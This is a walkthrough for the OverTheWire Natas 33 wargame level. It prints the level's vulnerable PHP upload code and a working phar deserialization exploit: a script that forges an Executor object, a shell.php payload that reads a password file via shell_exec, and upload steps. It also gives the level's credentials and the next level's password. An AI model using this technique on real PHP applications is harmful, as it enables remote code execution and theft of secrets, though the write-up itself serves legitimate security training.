# Natas33 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas33
Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
URL:      http://natas33.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- It's firmware upload challenge.

  ```
  <html>
      <head>
          <!-- This stuff in the header has nothing to do with the level -->
          <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
          <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
          <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
          <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
          <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
          <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
          <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
      </head>
      <body>
          <?php
              // graz XeR, the first to solve it! thanks for the feedback!
              // ~morla
              class Executor{
                  private $filename=""; 
                  private $signature='adeafbadbabec0dedabada55ba55d00d';
                  private $init=False;
  
                  function __construct(){
                      $this->filename=$_POST["filename"];
                      if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                          echo "File is too big<br>";
                      }
                      else {
                          if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                              echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                              echo "Firmware upgrad initialised.<br>";
                          }
                          else{
                              echo "There was an error uploading the file, please try again!<br>";
                          }
                      }
                  }
  
                  function __destruct(){
                      // upgrade firmware at the end of this script
  
                      // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                      chdir("/natas33/upload/");
                      if(md5_file($this->filename) == $this->signature){
                          echo "Congratulations! Running firmware update: $this->filename <br>";
                          passthru("php " . $this->filename);
                      }
                      else{
                          echo "Failur! MD5sum mismatch!<br>";
                      }
                  }
              }
          ?>
  
          <h1>natas33</h1>
          <div id="content">
              <h2>Can you get it right?</h2>
  
              <?php
                  session_start();
                  if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
                      new Executor();
                  }
              ?>
              <form enctype="multipart/form-data" action="index.php" method="POST">
                  <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                  <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                  Upload Firmware Update:<br/>
                  <input name="uploadedfile" type="file" /><br />
                  <input type="submit" value="Upload File" />
              </form>
  
              <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
          </div>
      </body>
  </html>
  ```

- First, create a `phar` file.

  ```
  $ cat natas33.php          
  <?php
  
  class Executor{
      private $filename = "shell.php";
      private $signature = True;
      private $init = false;
  }
  
  $phar = new Phar('natas.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'text');
  $phar->setStub('<?php __HALT_COMPILER(); ? >');
  
  $object = new Executor();
  $object->data = 'rips';
  $phar->setMetadata($object);
  $phar->stopBuffering();
  
  ?>
  ```

- Then create a `shell.php` file that will read the password.

  ```
  $ cat shell.php   
  <?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
  ```

- Now use `php -d phar.readonly=false natas33.php` and you should have 3 files.

  ```
  $ php -d phar.readonly=false natas33.php

  $ ls
  natas33.php natas.phar shell.php
  ```

- Now, we are gonna start uploading them one by one. Start with `shell.php`. Upload the file, find the request in History and send it to Repeater, then change the file name back to `shell.php`.

  <img src=""/>

- Then we do the same thing with the `natas.phar` file.

  <img src=""/>

- Lastly, use the same request that we used for phar file, but now change the name to `phar://natas.phar/test.txt`. After sending the request you will see the natas34 password.

  <img src=""/>
---

## 🏁 Password for the next level

`Password for natas34 is: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY`

<img src=""/>

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
